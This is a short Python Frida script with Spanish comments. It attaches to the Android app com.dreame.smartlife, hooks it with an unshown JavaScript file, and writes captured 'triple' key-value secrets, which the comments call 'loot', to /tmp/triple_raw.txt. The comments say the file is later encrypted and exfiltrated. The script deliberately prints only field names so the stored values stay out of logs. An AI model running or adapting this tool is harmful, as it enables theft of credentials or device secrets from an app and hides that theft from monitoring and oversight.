import frida, sys, time

# Driver de LOOT del triple. Escribe valores SOLO a /tmp/triple_raw.txt (se cifra y
# exfila). En stdout imprime SOLO el nombre del campo, nunca el valor -> log limpio.

dev = frida.get_device_manager().add_remote_device('127.0.0.1:27042')
out = open('/tmp/triple_raw.txt', 'a', encoding='utf-8')

def onmsg(m, d):
    if m.get('type') == 'send':
        p = m.get('payload')
        if isinstance(p, dict) and p.get('t') == 'triple':
            out.write(str(p.get('k')) + '=' + str(p.get('v')) + '\n'); out.flush()
            print('GOT', p.get('k'))
            return
        if isinstance(p, dict) and p.get('t') == 'note':
            print('NOTE', p.get('m')); return
    print('MSG', str(m)[:200])

PKG = 'com.dreame.smartlife'
s = None
for i in range(40):
    try:
        s = dev.attach(PKG); print('attached (try %d)' % i); break
    except Exception as e:
        print('attach retry', str(e)[:80]); time.sleep(2)
if s is None:
    print('ABORT: no se pudo attachear a', PKG)
    out.write('--- attach-fail ---\n'); out.close(); sys.exit(0)

sc = s.create_script(open('hook_triple.js').read()); sc.on('message', onmsg); sc.load()
print('attached+hooked (triple loot)')
time.sleep(float(sys.argv[1]) if len(sys.argv) > 1 else 120)
out.write('--- done ---\n'); out.close()
